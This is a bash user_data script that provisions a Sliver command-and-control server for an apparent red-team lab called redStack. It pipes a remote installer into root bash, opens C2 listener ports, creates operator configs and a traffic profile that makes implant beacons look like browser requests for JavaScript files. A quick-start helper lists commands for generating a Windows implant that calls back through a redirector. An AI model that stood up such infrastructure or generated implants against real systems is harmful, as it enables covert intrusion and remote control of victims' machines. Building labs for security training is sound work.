#!/bin/bash
# sliver_setup.sh - Sliver C2 server installation
# Runs automatically via user_data on first boot

set -e

exec > >(tee /var/log/user-data.log)
exec 2>&1

echo "===== Sliver C2 Server Setup Started $(date) ====="

SSH_PASSWORD="${ssh_password}"
REDIRECTOR_VPC_CIDR="${redirector_vpc_cidr}"
C2_HEADER_NAME="${c2_header_name}"
C2_HEADER_VALUE="${c2_header_value}"

# Set hostname
hostnamectl set-hostname sliver

# Configure /etc/hosts for lab machines
cat >> /etc/hosts << HOSTS

# redStack lab hosts
${sliver_private_ip}     sliver
${guacamole_private_ip}  guac
${mythic_private_ip}     mythic
${adaptix_private_ip}      adaptix
${redirector_private_ip} redirector
${windows_private_ip}    windows
${kali_private_ip}       kali
HOSTS

# Update system
apt-get update
DEBIAN_FRONTEND=noninteractive apt-get upgrade -y

apt-get install -y \
    curl \
    git \
    build-essential \
    mingw-w64 \
    ufw \
    net-tools \
    jq

# Configure SSH password authentication for Guacamole access
echo "admin:$SSH_PASSWORD" | chpasswd
mkdir -p /home/admin
chown admin:admin /home/admin
usermod -d /home/admin -s /bin/bash admin

cat >> /etc/ssh/sshd_config << 'SSHCONF'

# Default: require SSH keys
PasswordAuthentication no
PubkeyAuthentication yes

# Allow password auth from private networks (for Guacamole access via VPC)
Match Address 172.16.0.0/12,10.0.0.0/8
    PasswordAuthentication yes
SSHCONF

systemctl restart sshd

# Configure UFW firewall
ufw --force reset
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw allow from $REDIRECTOR_VPC_CIDR to any port 80 proto tcp comment 'HTTP C2 from redirector'
ufw allow from $REDIRECTOR_VPC_CIDR to any port 443 proto tcp comment 'HTTPS C2 from redirector'
ufw allow 31337/tcp comment 'Sliver multiplexer'
ufw --force enable

# Add swap space — Sliver's Go compiler uses 1-2GB RAM during implant generation.
# Without swap, t3.small exhausts memory and sshd can no longer fork, causing
# banner-exchange hangs until reboot.
if [ ! -f /swapfile ]; then
    fallocate -l 2G /swapfile
    chmod 600 /swapfile
    mkswap /swapfile
    swapon /swapfile
    echo '/swapfile none swap sw 0 0' >> /etc/fstab
    echo "[+] 2GB swap enabled"
fi

# Install Sliver C2
curl https://sliver.sh/install | sudo bash

# Wait for installation to complete
sleep 10

# The Sliver install script places the server binary in /root — symlink it into PATH
if [ -f /root/sliver-server ]; then
    ln -sf /root/sliver-server /usr/local/bin/sliver-server
else
    echo "[!] WARNING: /root/sliver-server not found — install may have failed"
fi

which sliver-server > /dev/null || echo "[!] WARNING: Sliver binary not in PATH"

# Set UMask=0022 on Sliver service so generated implants are world-readable (no chmod needed)
mkdir -p /etc/systemd/system/sliver.service.d/
cat > /etc/systemd/system/sliver.service.d/umask.conf << 'UMASKCONF'
[Service]
UMask=0022
UMASKCONF

# Ensure Sliver service is enabled and running
systemctl daemon-reload
systemctl enable sliver --now || echo "[!] WARNING: Could not start sliver service"

# Wait for Sliver daemon to be ready on port 31337
for i in $(seq 1 30); do
    if ss -tlnp | grep -q ':31337'; then
        echo "[+] Sliver daemon ready on port 31337"
        break
    fi
    echo "    Waiting... ($i/30)"
    sleep 2
done

# Wipe all auto-generated configs from the Sliver installer so only ours exists.
# If multiple .cfg files are present, sliver-client shows a profile picker prompt.
rm -rf /home/admin/.sliver-client/configs/
rm -rf /root/.sliver-client/configs/

# Generate Sliver operator config for the admin identity (matches SSH user, lab convention)
sliver-server operator --name admin --lhost localhost --save /root/admin.cfg --permissions all

# Install config so admin can run sliver-client immediately on login
mkdir -p /home/admin/.sliver-client/configs
cp /root/admin.cfg /home/admin/.sliver-client/configs/admin.cfg
chown -R admin:admin /home/admin/.sliver-client
chmod 600 /home/admin/.sliver-client/configs/admin.cfg

# With only one .cfg in configs/, sliver-client auto-selects it — no alias needed.

# Create HTTP C2 profile with the redirector validation header pre-configured
jq -n \
  --arg header_name "$C2_HEADER_NAME" \
  --arg header_value "$C2_HEADER_VALUE" \
  '{
    "implant_config": {
      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "chrome_base_version": 120,
      "nonce_query_args": "abcdefghijklmnopqrstuvwxyz",
      "url_parameters": null,
      "headers": [{"name": $header_name, "value": $header_value, "probability": 100}],
      "nonce_query_length": 1,
      "nonce_mode": "UrlParam",
      "max_files": 4,
      "min_files": 2,
      "max_paths": 4,
      "min_paths": 2,
      "max_path_length": 4,
      "min_path_length": 2,
      "extensions": ["js", "", "php"],
      "files": ["jquery.min", "bootstrap", "app", "main", "index", "script"],
      "paths": ["js", "assets", "scripts", "static", "dist"]
    },
    "server_config": {
      "random_version_headers": false,
      "headers": [{"name": "Cache-Control", "value": "no-store, no-cache, must-revalidate", "probability": 100, "method": "GET"}],
      "cookies": ["PHPSESSID"]
    }
  }' > /home/admin/redstack-c2-profile.json
chmod 644 /home/admin/redstack-c2-profile.json

# Create operator config generation script
cat > /root/generate_operator_config.sh << 'OPSCRIPT'
#!/bin/bash
# Generate a new operator config file for connecting to this Sliver server
# Usage: sudo ./generate_operator_config.sh <operator-name>

if [ -z "$1" ]; then
    echo "Usage: $0 <operator-name>"
    echo "Example: $0 operator1"
    exit 1
fi

OPERATOR_NAME=$1
echo "[*] Generating operator config for: $OPERATOR_NAME"
sliver-server operator --name "$OPERATOR_NAME" --lhost "$(hostname -I | awk '{print $1}')" --save "/root/$${OPERATOR_NAME}.cfg" --permissions all
echo "[*] Config saved to /root/$${OPERATOR_NAME}.cfg"
echo "[*] Transfer this file to the operator's machine to connect"
OPSCRIPT
chmod +x /root/generate_operator_config.sh

# Create a quick-start helper script
cat > /root/sliver_quickstart.sh << 'QUICKSTART'
#!/bin/bash
echo "===== Sliver C2 Quick Start ====="
echo ""
echo "The Sliver daemon runs as a systemd service and starts automatically on boot."
echo ""
echo "1. Connect to the Sliver console:"
echo "   sliver-client"
echo ""
echo "2. Import the redstack C2 profile (first time only):"
echo "   c2profiles import --file /home/admin/redstack-c2-profile.json --name redstack"
echo ""
echo "3. Start an HTTP listener:"
echo "   http --lhost 0.0.0.0 --lport 80"
echo ""
echo "4. Generate an implant:"
echo "   generate --http https://REDIRECTOR_DOMAIN/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/implant.exe"
echo ""
echo "5. Transfer to Windows (from PowerShell on windows):"
echo "   scp admin@sliver:/tmp/implant.exe C:\Users\Administrator\Desktop\implant.exe"
echo ""
echo "Service status:"
systemctl status sliver --no-pager 2>/dev/null || echo "Sliver service not found"
echo ""
echo "Multiplexer port: 31337"
QUICKSTART
chmod +x /root/sliver_quickstart.sh

echo "===== Sliver C2 Server Setup Completed $(date) ====="
